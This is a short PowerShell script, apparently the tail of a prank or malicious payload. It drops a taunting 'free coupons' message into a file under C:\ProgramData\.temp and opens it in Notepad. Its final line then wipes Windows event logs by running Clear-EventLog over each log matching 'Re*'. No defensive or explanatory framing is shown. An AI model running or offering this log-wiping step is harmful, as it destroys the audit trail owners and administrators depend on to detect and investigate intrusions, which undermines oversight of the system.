"You have won 100% free coupons for lifetime ..." > C:\ProgramData\.temp\freecoupon
"Have Fun !!" >> C:\ProgramData\.temp\freecoupon
notepad.exe C:\ProgramData\.temp\freecoupon
Get-EventLog -LogName Re* | ForEach { Clear-EventLog $_.Log }
